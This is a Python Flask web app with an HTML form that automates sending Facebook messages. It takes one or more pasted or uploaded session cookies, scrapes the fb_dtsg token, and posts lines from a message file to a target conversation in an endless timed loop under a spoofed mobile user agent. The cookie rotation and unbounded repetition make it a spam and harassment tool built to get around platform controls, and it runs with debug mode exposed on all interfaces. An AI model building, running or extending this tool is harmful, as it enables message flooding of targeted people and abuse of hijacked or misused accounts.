from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import re

app = Flask(__name__)
app.debug = True

headers_template = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'Referer': 'https://m.facebook.com',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
}

stop_events = {}
threads = {}
message_counters = {}

def get_fb_dtsg(cookie):
    """Scrape fb_dtsg token from Facebook mobile page using given cookie."""
    session = requests.Session()
    headers = headers_template.copy()
    headers['Cookie'] = cookie
    r = session.get('https://m.facebook.com', headers=headers)
    if r.status_code != 200:
        print("FB homepage request failed:", r.status_code)
        return None
    match = re.search(r'name="fb_dtsg" value="([^"]+)"', r.text)
    if match:
        return match.group(1)
    else:
        print("fb_dtsg token not found in page")
        return None

def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    message_counters[task_id] = 0
    while not stop_event.is_set():
        for cookie in cookies_list:
            if stop_event.is_set():
                break
            fb_dtsg = get_fb_dtsg(cookie)
            if not fb_dtsg:
                print("Skipping this cookie, fb_dtsg not found")
                continue
            headers = headers_template.copy()
            headers['Cookie'] = cookie
            for message1 in messages:
                if stop_event.is_set():
                    break
                api_url = f'https://m.facebook.com/messages/send/?icm=1&refid=12'
                payload = {
                    'ids[0]': thread_id,
                    'message': f"{mn} {message1}",
                    'fb_dtsg': fb_dtsg,
                    'send': 'Send',
                }
                try:
                    response = requests.post(api_url, data=payload, headers=headers)
                    if response.status_code == 200 and ('success' in response.text or '"error"' not in response.text):
                        message_counters[task_id] += 1
                        print(f"✅ Sent ({message_counters[task_id]}): {payload['message']}")
                    else:
                        print(f"❌ Failed ({response.status_code}): {payload['message']}")
                        print("Response Text:", response.text[:200])
                except Exception as e:
                    print("Error sending message:", e)
                time.sleep(time_interval)
        time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        cookie_option = request.form.get('tokenOption')
        if cookie_option == 'single':
            cookies_list = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            cookies_list = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(cookies_list, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return render_template_string(PAGE_HTML, task_id=task_id)

    return render_template_string(PAGE_HTML, task_id=None)

@app.route('/status/<task_id>')
def get_status(task_id):
    count = message_counters.get(task_id, 0)
    running = task_id in threads and not stop_events[task_id].is_set()
    return jsonify({'count': count, 'running': running})

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

PAGE_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Facebook Cookie Message Sender</title>
<style>
    body { background: #222; color: #fff; font-family: Arial, sans-serif; padding: 20px; }
    .container { max-width: 400px; margin: auto; background: #333; padding: 20px; border-radius: 10px; }
    label { font-weight: bold; display: block; margin-top: 10px; }
    input, textarea, select, button { width: 100%; margin-top: 5px; padding: 8px; border-radius: 5px; border: none; }
    button { background-color: #3b5998; color: white; font-weight: bold; cursor: pointer; }
    button:hover { background: #2d4373; }
    .status-box { margin-top: 15px; background: #111; padding: 10px; border-radius: 5px; }
</style>
</head>
<body>
<div class="container">
<h2>Facebook Cookie Based Message Sender</h2>
<form method="post" enctype="multipart/form-data">
<label>Select Cookie Input Option:</label>
<select name="tokenOption" id="tokenOption" onchange="toggleInputs();">
  <option value="single">Single Cookie String</option>
  <option value="multiple">Cookie File Upload</option>
</select>

<div id="singleTokenDiv">
  <label>Paste Full Facebook Cookie</label>
  <textarea name="singleToken" rows="4" placeholder="Paste your full Facebook cookie here"></textarea>
</div>

<div id="multipleTokenDiv" style="display:none;">
  <label>Upload Cookie File (txt)</label>
  <input type="file" name="tokenFile" />
</div>

<label>Enter Thread ID (Inbox/Convo UID)</label>
<input type="text" name="threadId" required/>

<label>Enter Your Name Prefix</label>
<input type="text" name="kidx" required/>

<label>Enter Time Interval (seconds)</label>
<input type="number" name="time" required/>

<label>Upload Messages File (txt)</label>
<input type="file" name="txtFile" required/>

<button type="submit">Start Sending Messages</button>
</form>

<div class="status-box" id="statusBox" style="display:none;">
  <strong>Task ID:</strong> <span id="taskId"></span><br/>
  <strong>Messages Sent:</strong> <span id="msgCount">0</span>
</div>

<form method="post" action="/stop" style="margin-top: 15px;">
<label>Enter Task ID to Stop</label>
<input type="text" name="taskId" required/>
<button type="submit" style="background:red;">Stop Task</button>
</form>
</div>

<script>
  function toggleInputs() {
    var option = document.getElementById('tokenOption').value;
    document.getElementById('singleTokenDiv').style.display = (option === 'single') ? 'block' : 'none';
    document.getElementById('multipleTokenDiv').style.display = (option === 'multiple') ? 'block' : 'none';
  }

  // Optional: You can add ajax polling for status if you want
</script>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
